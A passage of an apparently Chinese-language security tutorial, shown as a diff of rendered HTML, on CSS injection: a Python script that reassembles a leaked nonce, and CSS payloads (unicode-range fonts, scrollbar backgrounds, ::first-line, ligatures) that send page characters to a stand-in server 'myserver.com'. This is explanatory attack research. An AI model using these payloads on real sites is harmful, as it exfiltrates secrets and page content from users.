+    <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<h4 id="8-3-3-Python-实现"><a href="#8-3-3-Python-实现" class="headerlink" title="8.3.3 Python 实现"></a>8.3.3 Python 实现</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">retrieveNonce</span><span class="token punctuation">(</span>nonce_substr<span class="token operator">=</span>nonce_substr<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># find the beginning of the nonce (there is no match for start)</span>
+    new_substr <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>nonce_substr<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">30</span> <span class="token keyword">and</span> <span class="token keyword">not</span> force<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"different length of new_substr [</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">] - aborting"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token number">0</span>
+    backup <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    nonce <span class="token operator">=</span> <span class="token string">''</span>
+    remove_i <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        start_i <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
+        left <span class="token operator">=</span> <span class="token number">0</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            end_j <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+            <span class="token keyword">if</span> i <span class="token operator">!=</span> j<span class="token punctuation">:</span>
+                <span class="token keyword">if</span> start_i <span class="token operator">==</span> end_j<span class="token punctuation">:</span>
+                    left <span class="token operator">=</span> <span class="token number">1</span>
+                    <span class="token keyword">break</span>
+        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token comment"># beginning</span>
+            remove_i <span class="token operator">=</span> i
+            nonce <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no beginning - aborting"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token number">0</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        new_substr <span class="token operator">=</span> new_substr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>remove_i<span class="token punctuation">]</span> <span class="token operator">+</span> new_substr<span class="token punctuation">[</span>remove_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+        <span class="token comment"># print("new substr: " + str(new_substr))</span>
+        found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            start_i <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>nonce<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> start_i<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token comment"># print("found: " + start_i)</span>
+                found <span class="token operator">+=</span> <span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># start over from latest backup</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>backup<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                nonce <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+                found <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+                new_substr <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+                backup <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no backup - aborting"</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"found more than one: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                backup <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>nonce<span class="token punctuation">,</span> found<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> new_substr<span class="token punctuation">]</span><span class="token punctuation">]</span>
+            remove_i <span class="token operator">=</span> found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+            nonce <span class="token operator">+=</span> new_substr<span class="token punctuation">[</span>remove_i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+
+        <span class="token comment"># input("nonce: " + nonce)</span>
+
+    <span class="token keyword">return</span> nonce
+</code></pre>
+
+<h2 id="9-页面内容泄露"><a href="#9-页面内容泄露" class="headerlink" title="9. 页面内容泄露"></a>9. 页面内容泄露</h2><p>上述介绍的方法由于 CSS Selector 的限制，只能够获取到元素属性的值，<br>如果我们想要获取到页面上的其他文字或者脚本的内容，则需要使用其他的特殊方法</p>
+<h3 id="9-1-unicode-range"><a href="#9-1-unicode-range" class="headerlink" title="9.1 unicode-range"></a>9.1 unicode-range</h3><blockquote>
+<p>unicode-range 可以针对不同的字元，载入不同的字体</p>
+</blockquote>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Ampersand"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span><span class="token string">"Times New Roman"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+26<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> Ampersand<span class="token punctuation">,</span> Helvetica<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Me &amp; You = Us<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<p><code>&amp;</code> 的 unicode 是 U+0026，因此只有 <code>&amp;</code> 这个字会用不同的字体来显示，剩余部分都用同一个字体<br>因此我们可以利用它来泄露页面中的内容：</p>
+<pre class="language-css" data-language="css"><code class="language-css">&lt;!DOCTYPE html>
+&lt;html>
+  &lt;body>
+    &lt;style>
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f1"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+31<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f2"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=2<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+32<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f3"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=3<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+33<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+61<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fb"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+62<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fc"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=c<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+63<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f3<span class="token punctuation">,</span> fa<span class="token punctuation">,</span> fb<span class="token punctuation">,</span> fc<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    &lt;/style>
+    <span class="token property">Secret</span><span class="token punctuation">:</span> &lt;div>ca31a&lt;/div>
+  &lt;/body>
+&lt;/html></code></pre>
+<p>但这种方法也具有局限性：</p>
+<ol>
+<li>无法得知字元的顺序</li>
+<li>无法获知字元的重复与否</li>
+</ol>
+<h3 id="9-2-字体高度差异-first-line-scrollbar"><a href="#9-2-字体高度差异-first-line-scrollbar" class="headerlink" title="9.2 字体高度差异 + first-line + scrollbar"></a>9.2 字体高度差异 + first-line + scrollbar</h3><p>我们其实可以不载入外部字体，用内建的字体就能泄露出字元。<br>我们首先要找出两组高度不同的内建字体，<br>例如 <code>Comic Sans MS</code> 字体，已知它的高度比 <code>Courier New</code> 高，<br>假设预设的字体高度是 30px ，而 Comic Sans MS 是 45px ，那现在我们把文字区块的高度设成 40px ，并且载入字体：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
+        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
+        <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
+        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
+        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
+        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
+        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>DBC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>ABC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p><img src="image-6.png" alt="image-6.png"></p>
+<p>在图中，很明显 <code>A</code> 比其他字元的高度都高，<br>而且根据我们的 CSS 设定，如果内容高度超过容器高度，会出现 scrollbar 。<br>虽然图中看不出来，但是下面的 ABC 存在 scrollbar，而上面的 DBC 却没有。</p>
+<p>如果此时我们给 scrollbar 设置一个 style：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>则如果有 scrollbar 出现，我们的 server 就会收到请求，<br>如果 scrollbar 没有出现，我们就不会收到请求。</p>
+<p>所以当我们把 div 套用 fa 字体时，</p>
+<ul>
+<li>如果画面上有 <code>A</code> ，就会出现 scrollbar ，我们的 server 就会收到请求。</li>
+<li>如果画面上没有 <code>A</code> ，就什么事情都不会发生。</li>
+</ul>
+<p>因此，我如果一直重复载入不同字体，那我在 server 就能知道画面上有什么字元，这点跟刚刚我们使用 unicode-range 做到的事情是一样的。</p>
+<h4 id="9-2-1-字元顺序问题"><a href="#9-2-1-字元顺序问题" class="headerlink" title="9.2.1 字元顺序问题"></a>9.2.1 字元顺序问题</h4><p>我们先把 div 的宽度缩减到只能显示一个字元，<br>这样其他字元就会被放到第二行去，<br>再使用 <code>::first-line</code> 的 selector ，就可以特别针对第一行来设置样式：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
+        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>
+        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
+        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
+        <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
+        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
+        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
+        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
+        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
+        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token selector">div::first-line</span><span class="token punctuation">&#123;</span>
+        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>CBAD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<p>画面上就只会存在一个 <code>C</code> 的字元，<br>因为我们先用<code>font-size: 0px</code> 把所有字元的尺寸都设为 0，<br>再用 <code>div::first-line</code> 去做调整，<br>让第一行的 <code>font-size</code> 变成 30px。<br>换句话说，只有第一行的字元能看到，而现在的 div 宽度只有 20px，所以只会出现第一个字元。</p>
+<p>接着，我们再运用刚刚学会的那招，去载入不同的字体。<br>当我载入 fa 这个字体时，因为画面上没有出现 <code>A</code> ，所以不会有任何变化。<br>但是当我载入 fc 这个字体时，画面上有 <code>C</code> ，<br>所以就会用 <code>Comic Sans MS</code> 来显示 <code>C</code> ，高度就会变高，scrollbar 就会出现，<br>就可以利用它来发出请求，代码如下：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
+  <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
+  <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> fc<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
+  <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
+  <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
+  <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
+  <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
+  <span class="token property">--leak</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://myserver.com?C<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">div::first-line</span><span class="token punctuation">&#123;</span>
+  <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>那我们要怎么样不断使用新的 font-family 呢？用 CSS animation 就可以做到，<br>我们可以使用 CSS animation 不断载入不同的 font-family 以及指定不同的 –-leak。</p>
+<p>如此一来，我们就能知道画面上的第一个字元到底是什么。</p>
+<h4 id="9-2-2-步骤"><a href="#9-2-2-步骤" class="headerlink" title="9.2.2 步骤"></a>9.2.2 步骤</h4><p>知道了第一个字元以后，我们把 div 的宽度变长，例如说变成 40px ，就能容纳两个字元，<br>因此第一行就会是前两个字，接着再用一样的方式载入不同的font-family，就能 leak 出第二个字元，详细流程如下：</p>
+<ol>
+<li>假设画面上是ACB</li>
+<li>调整宽度为20px，第一行只出现第一个字元 A</li>
+<li>载入字体fa，因此 A 用较高的字体显示，出现 scrollbar，载入 scrollbar 背景，传送请求给server</li>
+<li>载入字体fb，但是 B 没有出现在画面上，因此没有任何变化。</li>
+<li>载入字体fc，但是 C 没有出现在画面上，因此没有任何变化。</li>
+<li>调整宽度为40px，第一行出现两个字元 AC</li>
+<li>载入字体fa，因此 A 用较高的字体显示，出现 scrollbar，此时因为这个背景已经载入，所以不会发送新的请求</li>
+<li>载入字体fb，但是 B 没有出现在画面上，因此没有任何变化</li>
+<li>载入字体fc，因此 C 用较高的字体显示，出现 scrollbar，并且载入背景</li>
+<li>调整宽度为60px，ACB 三个字元都出现在第一行</li>
+<li>载入字体fa，同第七步</li>
+<li>载入字体fb，B 用较高的字体显示，出现 scrollbar 并且载入背景</li>
+<li>载入字体fc，C 用较高的字体显示，但因为已经载入过相同背景，不会发送请求</li>
+<li>结束</li>
+</ol>
+<p>从上面流程中可以看出 server 会依序收到A, C, B 三个reqeust，代表了画面上字元的顺序。<br>而不断改变宽度以及 font-family 都可以用 CSS animation 做到</p>
+<h4 id="9-2-3-局限性"><a href="#9-2-3-局限性" class="headerlink" title="9.2.3 局限性"></a>9.2.3 局限性</h4><p>这个解法虽然解决了不知道字元顺序的问题，但依然无法解决重复字元的问题，<br>因为重复的字元不会再发出请求。</p>
+<h3 id="9-3-连字-scrollbar"><a href="#9-3-连字-scrollbar" class="headerlink" title="9.3 连字 + scrollbar"></a>9.3 连字 + scrollbar</h3><h4 id="9-3-1-连字"><a href="#9-3-1-连字" class="headerlink" title="9.3.1 连字"></a>9.3.1 连字</h4><p>在某些字型当中，会把一些特定的组合 render 成连在一起的样子，如下图：</p>
+<p><img src="image-7.png" alt="image-7.png"></p>
+<h4 id="9-3-2-实现方法"><a href="#9-3-2-实现方法" class="headerlink" title="9.3.2 实现方法"></a>9.3.2 实现方法</h4><p>我们可以自己制作出一个独特的字体，把 <code>ab</code> 设定成连字，并且 render 出一个超宽的元素。<br>接着，我们把某个 div 宽度设成固定，然后结合 scrollbar：</p>
+<ul>
+<li>如果 ab 出现了，就会变很宽，scrollbar 就会出现，就可以载入请求来告诉 server；</li>
+<li>如果 ab 没有出现，那 scrollbar 就不会出现，就不会有事情发生。</li>
+</ul>
+<h4 id="9-3-3-步骤"><a href="#9-3-3-步骤" class="headerlink" title="9.3.3 步骤"></a>9.3.3 步骤</h4><ol>
+<li>载入有连字 aa 的字体，没有发生变化</li>
+<li>载入有连字 ab 的字体，没有发生变化</li>
+<li>载入有连字 ac 的字体，成功渲染宽画面，scrollbar 出现，载入 server 图片</li>
+<li>server 知道画面上有 ac</li>
+<li>载入有连字 aca 的字体，没有发生变化</li>
+<li>载入有连字 acb 的字体，没有发生变化</li>
+<li>载入有连字 acc 的字体，成功渲染宽画面，scrollbar 出现，传送结果给 server</li>
+<li>server 知道画面上有 acc</li>
+</ol>
